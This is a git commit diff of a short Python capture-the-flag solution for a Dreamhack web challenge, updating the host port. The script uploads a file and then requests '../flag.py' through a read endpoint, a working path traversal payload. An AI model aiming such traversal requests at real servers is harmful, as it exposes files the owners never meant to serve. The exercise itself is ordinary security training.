64e3d4989d19f147383f7c646951d9415a67df46
jzead <2006624sjh@gmail.com>
2026-02-19 16:33:03 +0900

    solved

--- Dreamhack/Web/File-Download.py
+++ Dreamhack/Web/File-Download.py
@@ -1,7 +1,7 @@
 import requests
 
-url = "http://host3.dreamhack.games:12453/upload"
-payload = "http://host3.dreamhack.games:12453/read?name=../flag.py"
+url = "http://host3.dreamhack.games:12877//upload"
+payload = "http://host3.dreamhack.games:12877//read?name=../flag.py"
 
 res = requests.post(url,data={'filename':'flag.py','content':'hello'})
 res = requests.get(payload)
